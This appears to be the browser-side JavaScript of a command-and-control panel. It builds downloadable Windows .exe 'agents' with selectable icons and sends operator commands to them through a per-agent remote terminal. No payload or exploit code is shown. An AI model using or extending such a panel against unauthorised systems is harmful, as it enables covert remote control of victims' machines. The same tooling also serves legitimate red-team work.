// Track the current agent ID for terminal access
let currentAgentID = null;
// Processing state for terminal commands
let isCommandRunning = false;
// Map to track command names by agent ID (terminal)
let pendingCommandsByAgent = new Map();
// Variables to track agent names and running commands - TODO
let commandAgentsRunning = new Map();

// Add listeners to modal
const modalAgent = document.getElementById('create-agent-modal');
document.addEventListener('keydown', (e) => {
    // Handle Escape key to close modals
    if (e.key === 'Escape') {
        modalAgent.classList.add('hidden');
    // Handle Enter key to create an agent
    } else if (e.key === 'Enter' && !modalAgent.classList.contains('hidden')) {
      submitAgent()
    }
});

// Render icon preview on selection
document.getElementById('agent-icon').addEventListener('change', function () {
  const value = this.value;
  if (value === "none") {
    document.getElementById('icon-preview').src= `/static/img/icon/${value}.ico`;
    return;
  }
  document.getElementById('icon-preview').src = `/static/img/icon/${value}.ico`;
});

// Show the create agent modal
function createAgentModal() {
    document.getElementById('create-agent-modal').classList.remove('hidden')
}

// close agent modal
function closeAgentModal() {
  const modal = document.getElementById('create-agent-modal');
  modal.classList.remove('create-agent-modal');
  modal.classList.add('hidden');
}

// Submit new agent data to the server and store it
function submitAgent() {
  const name = document.getElementById('agent-name').value.trim();
  const os = document.getElementById('agent-os').value;
  const type = document.getElementById('agent-type').value;
  const icon = document.getElementById('agent-icon').value;
  const dstport = document.getElementById('agent-dst-port').value;

  if (name === "") {
    alert("Enter an agent name.");
    return;
  }

  // Generate a unique ID based on timestamp
  const id = `${Date.now()}`;

  fetch('/api/submit-agent', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({name, id, os, type, icon, dstport})
  })
  .then( () => {
    document.getElementById('create-agent-modal').classList.add('hidden');
  });
}

// Display windows icon in option configuration for agent's creation
document.getElementById('agent-os').addEventListener('input', function () {
  const os = document.getElementById('agent-os').value;
  const iconSection = document.getElementById('icon-part');
  if (os === 'windows') {
    iconSection.classList.remove('hidden');
  } else {
    iconSection.classList.add('hidden');
    document.getElementById('agent-icon').value = "none";
    document.getElementById('icon-preview').src = `/static/img/icon/none.ico`
  }
});

// Download the built agent from the server
function downloadAgent(name, id, os, type, icon, dstport) {
  fetch('/api/build-agent', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({name, id, os, type, icon, dstport})
  })
  .then(res => res.blob())
  .then(blob => {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${name}.exe`;
    a.click();
    window.URL.revokeObjectURL(url);
    fetch('/api/flush-agent-files')
      .then(res => res.json())
      .then(console.log);
  })
  .catch(err => console.error("Error when building agent :", err));
}

// Access terminal for a specific agent
function accessTerminal(name, id) {
  const panel = document.getElementById("terminal-panel");
  const title = document.getElementById("terminal-agent-id");
  const input = document.getElementById("terminal-input");
  const output = document.getElementById("terminal-output");

  // If we click on the same agent, we close the terminal
  if (currentAgentID === id) {
    panel.classList.add("hidden");
    currentAgentID = null;

    document.querySelectorAll('#agents-table-body tr').forEach(row => {
      row.classList.remove('selected-agent');
    });

    return;
  }

  // Else, we open the terminal for the selected agent
  currentAgentID = id;

  document.querySelectorAll('#agents-table-body tr').forEach(row => {
    row.classList.remove('selected-agent');
  });

  const selectedRow = document.querySelector(`#agents-table-body tr[data-id="${id}"]`);
  if (selectedRow) selectedRow.classList.add('selected-agent');

  panel.classList.remove("hidden");
  title.textContent = `Terminal - Agent : ${name} (${id})`;
  output.innerHTML = "";
  // input.classList.add("ring-2", "ring-green-500", "ring-offset-2");
  input.focus();
}

// Close the terminal panel
function closeTerminal() {
  const terminal = document.getElementById('terminal-panel');
  if (terminal) {
    terminal.classList.add('hidden');
  }

  document.querySelectorAll('#agents-table-body tr').forEach(row => {
    row.classList.remove('selected-agent');
  });

  currentAgentID = null;
}

// Send command to the server for the current agent using the terminal
function sendTerminalCommand() {
  const input = document.getElementById('terminal-input');
  const output = document.getElementById('terminal-output');
  const sendBtn = document.querySelector('#terminal-panel button');
  const spinner = document.getElementById('terminal-spinner');
  const command = input.value.trim();
  const agentId = currentAgentID;
  
  if (isCommandRunning) return;

  isCommandRunning = true;


  if (!command || !agentId || !agentName.has(agentId)) {
    alert("Invalid command or agent not found.");
    isCommandRunning = false;
    return;
  }

  // UI feedback
  sendBtn.disabled = true;
  sendBtn.classList.add('opacity-50', 'cursor-not-allowed');
  spinner.classList.remove('hidden');

  fetch(`/api/send-terminal-command?id=${encodeURIComponent(agentId)}&cmd=${encodeURIComponent(command)}`, {
    method: 'POST'
  })
    .then(() => {
      if (!pendingCommandsByAgent.has(agentId)) {
        pendingCommandsByAgent.set(agentId, []);
      }

      pendingCommandsByAgent.get(agentId).push(command);

    })
    .catch(err => {
      console.error("Error when sending command :", err);
      isCommandRunning = false;
      sendBtn.disabled = false;
      sendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
      spinner.classList.add('hidden');
    });


  document.getElementById('terminal-input').value = '';
}